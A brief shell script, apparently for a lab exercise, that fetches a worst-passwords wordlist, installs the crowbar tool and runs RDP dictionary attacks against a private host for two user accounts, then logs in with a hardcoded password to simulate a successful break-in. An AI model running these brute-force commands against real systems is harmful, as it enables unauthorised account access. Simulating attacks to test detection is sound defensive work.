# Download 500 worst passwords dictionary
wget http://downloads.skullsecurity.org/passwords/500-worst-passwords.txt.bz2
bzip2 -d 500-worst-passwords.txt.bz2

# Install crowbar
sudo apt install -y ubuntu-desktop nmap openvpn freerdp-x11 tigervnc-viewer python3 python3-pip

git clone https://github.com/galkan/crowbar
cd crowbar/
pip3 install -r requirements.txt

# Run dictionary attack
./crowbar.py -b rdp -u administrator -C ../500-worst-passwords.txt -s 10.0.0.4/32 -v -D -n1
./crowbar.py -b rdp -u tomas -C ../500-worst-passwords.txt -s 10.0.0.4/32 -v -D -n 1

# Get in to simulate success
./crowbar.py -b rdp -u tomas -c Azure12345678 -s 10.0.0.4/32 -v -D -n 1
